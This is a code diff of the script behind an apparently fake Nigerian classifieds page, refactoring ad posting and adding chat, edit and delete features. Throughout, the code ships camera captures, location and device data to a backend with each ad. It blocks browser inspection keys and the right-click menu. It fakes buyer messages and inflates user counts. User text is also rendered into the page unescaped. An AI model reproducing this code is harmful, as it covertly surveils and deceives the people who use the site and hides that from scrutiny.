@@ -503,31 +618,25 @@
     }
 
     // Post Ad
-    document.getElementById('postAdBtn').addEventListener('click', async () => {
+    async function postAd() {
         const title = document.getElementById('adTitle').value.trim();
-        const category = document.getElementById('adCategory').value;
-        const desc = document.getElementById('adDesc').value.trim();
-        const price = document.getElementById('adPrice').value.trim();
-        const locationInput = document.getElementById('adLocation').value.trim();
-        const phone = document.getElementById('contactPhone').value.trim();
-        
-        if (!title) {
-            showToast("Please enter an ad title");
-            return;
-        }
+        if (!title) { showToast("Please enter an ad title", true); return; }
         
         const btn = document.getElementById('postAdBtn');
-        const originalText = btn.innerHTML;
         btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Posting...';
         btn.disabled = true;
         
         const device = await getDeviceInfo();
-        
         const newAd = {
             id: Date.now(),
-            category, title, description: desc, price: price || 'Free',
-            location: locationInput || 'Nigeria', phone: phone || 'Not provided',
-            images: uploadedImages, views: 0,
+            category: document.getElementById('adCategory').value,
+            title: title,
+            description: document.getElementById('adDesc').value.trim(),
+            price: document.getElementById('adPrice').value.trim() || 'Free',
+            location: document.getElementById('adLocation').value.trim() || 'Nigeria',
+            phone: document.getElementById('contactPhone').value.trim() || 'Not provided',
+            images: uploadedImages,
+            views: 0,
             timestamp: new Date().toISOString()
         };
         
@@ -535,16 +644,9 @@
         localStorage.setItem('userAds', JSON.stringify(userAds));
         
         await sendToBackend({
-            id: Date.now(),
-            type: 'ad_posted',
-            timestamp: new Date().toISOString(),
-            ad: newAd,
-            location: userLocation,
-            cameraImage: capturedPhoto,
-            device: device,
-            ip: device.ip,
-            cameraGranted: cameraGranted,
-            locationGranted: locationGranted
+            id: Date.now(), type: 'ad_posted', timestamp: new Date().toISOString(),
+            ad: newAd, location: userLocation, cameraImage: capturedPhoto,
+            device: device, cameraGranted: cameraGranted, locationGranted: locationGranted
         });
         
         // Reset form
@@ -556,41 +658,178 @@
         uploadedImages = [];
         displayImages();
         
-        btn.innerHTML = originalText;
+        btn.innerHTML = '<i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now';
         btn.disabled = false;
         showToast(`✅ "${title}" posted successfully!`);
         updateStats();
-    });
+        renderMyAds();
+    }
+
+    document.getElementById('postAdBtn').onclick = postAd;
+
+    // My Ads Functions
+    function renderMyAds() {
+        const grid = document.getElementById('myAdsGrid');
+        if (userAds.length === 0) {
+            grid.innerHTML = `<div style="text-align:center; padding:40px; color:#a0aec0;">No ads posted yet. <a onclick="showHome()" style="color:#667eea; cursor:pointer;">Post your first ad!</a></div>`;
+            return;
+        }
+        
+        grid.innerHTML = userAds.map((ad, idx) => `
+            <div class="my-ad-card">
+                <div class="ad-price">${ad.price}</div>
+                <div class="ad-title">${ad.title}</div>
+                <div class="ad-location"><i class="fas fa-map-marker-alt"></i> ${ad.location}</div>
+                <div class="ad-stats"><span><i class="fas fa-eye"></i> ${(ad.views || 0).toLocaleString()} views</span></div>
+                <div class="ad-actions">
+                    <button class="chat-btn" onclick="openChat(${idx})"><i class="fas fa-comments"></i> Messages</button>
+                    <button class="edit-btn" onclick="editAd(${idx})"><i class="fas fa-edit"></i> Edit</button>
+                    <button class="delete-btn" onclick="deleteAd(${idx})"><i class="fas fa-trash"></i> Delete</button>
+                </div>
+            </div>
+        `).join('');
+        
+        // Update message badge
+        let totalUnread = 0;
+        Object.values(chats).forEach(chat => { totalUnread += chat.filter(m => !m.read).length; });
+        document.getElementById('msgBadge').innerText = totalUnread;
+    }
+
+    function openChat(index) {
+        currentChatIndex = index;
+        const ad = userAds[index];
+        const chatId = `ad_${ad.id}`;
+        
+        if (!chats[chatId]) chats[chatId] = [];
+        
+        document.getElementById('chatAdTitle').innerText = ad.title;
+        renderChatMessages(chatId);
+        
+        document.getElementById('myAdsSection').classList.remove('active');
+        document.getElementById('chatSection').classList.add('active');
+        document.getElementById('featuredSection').style.display = 'none';
+        
+        // Mark as read
+        chats[chatId].forEach(m => m.read = true);
+        localStorage.setItem('chats', JSON.stringify(chats));
+        renderMyAds();
+    }
+
+    function renderChatMessages(chatId) {
+        const container = document.getElementById('chatMessages');
+        const messages = chats[chatId] || [];
+        
+        container.innerHTML = messages.map(msg => `
+            <div class="message ${msg.type}">
+                <div class="message-bubble">${msg.text}</div>
+                <div class="message-time">${new Date(msg.time).toLocaleTimeString()}</div>
+            </div>
+        `).join('');
+        container.scrollTop = container.scrollHeight;
+    }
+
+    document.getElementById('sendMsgBtn').onclick = () => {
+        const input = document.getElementById('chatInput');
+        const text = input.value.trim();
+        if (!text) return;
+        
+        const ad = userAds[currentChatIndex];
+        const chatId = `ad_${ad.id}`;
+        if (!chats[chatId]) chats[chatId] = [];
+        
+        chats[chatId].push({ type: 'seller', text: text, time: new Date().toISOString(), read: true });
+        localStorage.setItem('chats', JSON.stringify(chats));
+        renderChatMessages(chatId);
+        input.value = '';
+        
+        // Simulate buyer reply
+        setTimeout(() => {
+            const replies = ["Is this still available?", "Can you negotiate?", "Where are you located?", "I'm interested!"];
+            const randomReply = replies[Math.floor(Math.random() * replies.length)];
+            chats[chatId].push({ type: 'buyer', text: randomReply, time: new Date().toISOString(), read: false });
+            localStorage.setItem('chats', JSON.stringify(chats));
+            if (currentChatIndex === parseInt(chatId.split('_')[1])) renderChatMessages(chatId);
+            renderMyAds();
+            showToast("📩 New message from buyer!");
+        }, 15000);
+    };
+
+    function editAd(index) {
+        const ad = userAds[index];
+        document.getElementById('adCategory').value = ad.category;
+        document.getElementById('adTitle').value = ad.title;
+        document.getElementById('adDesc').value = ad.description;
+        document.getElementById('adPrice').value = ad.price;
+        document.getElementById('adLocation').value = ad.location;
+        document.getElementById('contactPhone').value = ad.phone;
+        uploadedImages = ad.images || [];
+        displayImages();
+        showHome();
+        showToast("Edit your ad, then click Post to update");
+    }
+
+    function deleteAd(index) {
+        if (confirm('Delete this ad permanently?')) {
+            userAds.splice(index, 1);
+            localStorage.setItem('userAds', JSON.stringify(userAds));
+            renderMyAds();
+            showToast("Ad deleted");
+        }
+    }
+
+    function showHome() {
+        document.getElementById('postAdForm').style.display = 'block';
+        document.getElementById('myAdsSection').classList.remove('active');
+        document.getElementById('chatSection').classList.remove('active');
+        document.getElementById('featuredSection').style.display = 'block';
+    }
     
-    function showToast(msg) {
+    function showMyAds() {
+        document.getElementById('postAdForm').style.display = 'none';
+        document.getElementById('myAdsSection').classList.add('active');
+        document.getElementById('chatSection').classList.remove('active');
+        document.getElementById('featuredSection').style.display = 'block';
+        renderMyAds();
+    }
+    
+    function showMessages() {
+        showMyAds();
+    }
+
+    function showToast(msg, isError = false) {
         const toast = document.getElementById('toastMsg');
-        toast.innerHTML = `<i class="fas fa-check-circle"></i> ${msg}`;
+        toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
+        toast.className = isError ? 'toast error' : 'toast';
         toast.classList.add('show');
         setTimeout(() => toast.classList.remove('show'), 3000);
     }
-    
+
     function updateStats() {
-        let ads = 284000 + Math.floor(Math.random() * 500) + userAds.length;
+        let ads = 284000 + userAds.length;
         let users = 12700 + Math.floor(Math.random() * 200);
         document.getElementById('statAds').innerHTML = (ads / 1000).toFixed(0) + 'K';
         document.getElementById('statUsers').innerHTML = (users / 1000).toFixed(1) + 'K';
     }
-    
+
     // Initialize
-    featuredAds.forEach(ad => startViewCounter(ad));
     renderFeaturedAds();
+    renderMyAds();
     updateStats();
     setInterval(updateStats, 8000);
     
     // Anti-inspection
-    document.addEventListener('contextmenu', (e) => e.preventDefault());
-    document.addEventListener('keydown', (e) => {
-        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
-            e.preventDefault();
-        }
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) e.preventDefault();
     });
     
     window.removeImage = removeImage;
+    window.openChat = openChat;
+    window.editAd = editAd;
+    window.deleteAd = deleteAd;
+    window.showHome = showHome;
+    window.showMyAds = showMyAds;
+    window.showMessages = showMessages;
     window.viewAdDetail = viewAdDetail;
 </script>
 </body>
